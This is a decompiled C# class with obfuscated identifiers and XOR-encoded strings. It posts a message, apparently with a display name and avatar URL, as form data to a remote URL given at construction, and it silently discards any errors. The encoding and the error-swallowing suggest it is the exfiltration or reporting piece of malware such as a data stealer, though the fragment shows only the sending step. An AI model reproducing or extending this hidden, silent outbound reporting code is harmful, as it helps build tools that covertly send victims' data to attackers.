using System;
using System.Collections.Generic;
using System.Net.Http;

internal class Class9
{
	private string string_0;

	public Class9(string string_1)
	{
		string_0 = string_1;
	}

	public void method_0(string string_1)
	{
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006a: Expected O, but got Unknown
		//IL_0072: Unknown result type (might be due to invalid IL or missing references)
		//IL_007c: Expected O, but got Unknown
		Dictionary<string, string> dictionary = new Dictionary<string, string>
		{
			{
				Class11.smethod_0("\uf618\uf614\uf615\uf60f\uf61e\uf615\uf60f", 63099),
				string_1
			},
			{
				Class11.smethod_0("\ueac3\ueac5\uead3\ueac4\uead8\uead7\ueadb\uead3", 60068),
				Class11.smethod_0("\ueb75\ueb52\ueb4f\ueb49\ueb54\ueb1b\ueb69\ueb5a\ueb55\ueb48\ueb54\ueb56\ueb4c\ueb5a\ueb49\ueb5e", 60171)
			},
			{
				Class11.smethod_0("\ue10a\ue11d\ue10a\ue11f\ue10a\ue119\ue134\ue11e\ue119\ue107", 57699),
				Class11.smethod_0("\uf237\uf22b\uf22b\uf22f\uf22c\uf265\uf270\uf270\uf236\uf271\uf236\uf23d\uf23d\uf271\uf23c\uf230\uf270\uf26f\uf239\uf22d\uf20b\uf21b\uf266\uf26d\uf270\uf23b\uf236\uf22c\uf23c\uf230\uf22d\uf23b\uf272\uf23e\uf229\uf23e\uf22b\uf23e\uf22d\uf272\uf26a\uf26e\uf26d\uf271\uf22f\uf231\uf238", 62031)
			}
		};
		try
		{
			HttpClient val = new HttpClient();
			try
			{
				val.PostAsync(string_0, (HttpContent)new FormUrlEncodedContent((IEnumerable<KeyValuePair<string, string>>)dictionary)).GetAwaiter().GetResult();
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
		}
	}
}
